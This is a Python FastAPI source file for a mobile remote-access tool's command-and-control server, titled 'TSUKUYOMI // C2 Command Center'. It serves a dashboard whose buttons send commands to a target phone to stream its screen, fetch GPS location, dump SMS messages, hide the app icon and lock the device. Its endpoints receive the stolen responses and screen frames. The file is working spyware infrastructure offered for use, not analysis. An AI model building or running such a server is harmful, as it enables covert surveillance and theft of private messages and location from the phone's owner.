from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse

app = FastAPI()

current_command = ""
latest_response = "Waiting for target connection..."
latest_screen_frame = ""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TSUKUYOMI // Ultimate Enterprise C2 Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background-color: #07090e; color: #e2e8f0; font-family: 'Inter', sans-serif; }
        .glass-panel { background: rgba(18, 24, 36, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
        .log { font-family: monospace; background: #090e17; border: 1px solid #1e293b; color: #55f0b3; padding: 12px; border-radius: 10px; height: 260px; overflow-y: auto; }
        .screen-box { width: 280px; height: 560px; background: #000; border: 6px solid #1e293b; border-radius: 24px; overflow: hidden; display: flex; align-items: center; justify-content: center; margin: auto; }
        .screen-box img { width: 100%; height: 100%; object-fit: cover; }
    </style>
</head>
<body class="p-4 md:p-8 flex flex-col items-center">
    <!-- Header -->
    <header class="w-full max-w-5xl glass-panel p-4 rounded-2xl mb-6 flex justify-between items-center shadow-lg">
        <div>
            <h1 class="font-bold text-base md:text-lg text-white tracking-wider">TSUKUYOMI // C2 COMMAND CENTER</h1>
            <p class="text-xs text-slate-400">Status: <span class="text-green-400 font-semibold">ONLINE (ULTIMATE EDITION)</span></p>
        </div>
        <div class="px-3 py-1 bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 rounded-lg text-xs font-mono">TARGET: SECURE TUNNEL</div>
    </header>

    <!-- Main Workspace -->
    <main class="w-full max-w-5xl grid grid-cols-1 md:grid-cols-12 gap-6">
        
        <!-- Left Column: Live Screen Mirroring (5 Cols) -->
        <div class="md:col-span-5 glass-panel p-4 rounded-2xl flex flex-col items-center space-y-4">
            <h3 class="text-xs font-bold font-mono uppercase text-slate-300 tracking-wide">Live Screen Mirroring</h3>
            <div class="screen-box" id="screenContainer">
                <span class="text-xs text-slate-500 text-center px-4">Waiting for screen frames...</span>
            </div>
            <div class="flex gap-2 w-full">
                <button onclick="sendCmd('SCREEN_START')" class="flex-1 py-2.5 bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold rounded-xl text-xs transition shadow-md">Start Stream</button>
                <button onclick="sendCmd('SCREEN_STOP')" class="flex-1 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl text-xs border border-slate-700 transition">Stop Stream</button>
            </div>
        </div>

        <!-- Right Column: Command Dispatcher & Terminal Logs (7 Cols) -->
        <div class="md:col-span-7 glass-panel p-4 rounded-2xl flex flex-col space-y-4">
            <h3 class="text-xs font-bold font-mono uppercase text-slate-300 tracking-wide">Command Dispatcher & Terminal</h3>
            
            <!-- Quick Feature & Power Buttons Grid -->
            <div class="grid grid-cols-3 gap-2">
                <button onclick="sendCmd('FLASH_ON')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-amber-400 font-medium transition">🔦 Flash ON</button>
                <button onclick="sendCmd('FLASH_OFF')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-slate-300 font-medium transition">🔦 Flash OFF</button>
                <button onclick="sendCmd('VIBRATE')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-cyan-300 font-medium transition">📳 Vibrate</button>
                <button onclick="sendCmd('GPS')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-rose-400 font-medium transition">📍 GPS Fix</button>
                <button onclick="sendCmd('DUMP_SMS')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-green-400 font-medium transition">📨 Dump SMS</button>
                <button onclick="sendCmd('STEALTH_ON')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-purple-400 font-medium transition">🥷 Hide Icon</button>
                <button onclick="sendCmd('LOCK_PHONE')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-red-400 font-medium transition">🔒 Lock Device</button>
                <button onclick="sendCmd('WAKE_PHONE')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-teal-300 font-medium transition">🔓 Wake Screen</button>
                <button onclick="sendCmd('VPN_TOGGLE')" class="p-2.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/80 rounded-xl text-xs text-blue-400 font-medium transition">🛡️ VPN Tunnel</button>
            </div>

            <!-- Custom Command Input Bar -->
            <div class="flex space-x-2">
                <input type="text" id="customCmd" placeholder="Enter custom command or payload..." class="flex-1 bg-slate-900 border border-slate-700 px-3 py-2.5 rounded-xl text-xs text-white focus:outline-none focus:border-cyan-400">
                <button onclick="dispatchCustom()" class="px-5 py-2.5 bg-cyan-400 hover:bg-cyan-300 text-slate-950 font-bold rounded-xl text-xs transition">SEND</button>
            </div>

            <!-- Real-time Terminal Log Box -->
            <div class="log" id="logBox">[SYSTEM] Ultimate FastAPI C2 Dashboard active...</div>
        </div>
    </main>

    <!-- JavaScript Control & Polling Logic -->
    <script>
        async function sendCmd(cmd) {
            try {
                await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: cmd })
                });
                log("[DISPATCHED] -> " + cmd);
            } catch (e) {
                log("[ERROR] Failed to dispatch command.");
            }
        }

        function dispatchCustom() {
            let input = document.getElementById('customCmd');
            if(input.value.trim()) {
                sendCmd(input.value.trim());
                input.value = '';
            }
        }

        async function pollData() {
            try {
                let res = await fetch('/api/response');
                let data = await res.json();
                if(data.response && data.response !== window.lastResp) {
                    window.lastResp = data.response;
                    log("[TARGET] " + data.response);
                }

                let screenRes = await fetch('/api/screen');
                let screenData = await screenRes.json();
                if(screenData.frame) {
                    document.getElementById('screenContainer').innerHTML = `<img src="data:image/jpeg;base64,${screenData.frame}" alt="Live Screen">`;
                }
            } catch(e) {}
        }
        
        setInterval(pollData, 500); // 500ms ultra-fast poll

        function log(msg) {
            let box = document.getElementById('logBox');
            let time = new Date().toLocaleTimeString();
            box.textContent += `\\n[${time}] ${msg}`;
            box.scrollTop = box.scrollHeight;
        }
    </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def home():
    return HTML_TEMPLATE

@app.api_route("/api/command", methods=["GET", "POST"])
async def handle_command(request: Request):
    global current_command
    if request.method == "POST":
        data = await request.json()
        current_command = data.get("command", "")
        return {"status": "success"}
    cmd = current_command
    current_command = ""
    return {"command": cmd}

@app.api_route("/api/response", methods=["GET", "POST"])
async def handle_response(request: Request):
    global latest_response
    if request.method == "POST":
        data = await request.json()
        latest_response = data.get("response", "")
        return {"status": "success"}
    return {"response": latest_response}

@app.api_route("/api/screen", methods=["GET", "POST"])
async def handle_screen(request: Request):
    global latest_screen_frame
    if request.method == "POST":
        data = await request.json()
        latest_screen_frame = data.get("frame", "")
        return {"status": "success"}
    return {"frame": latest_screen_frame}
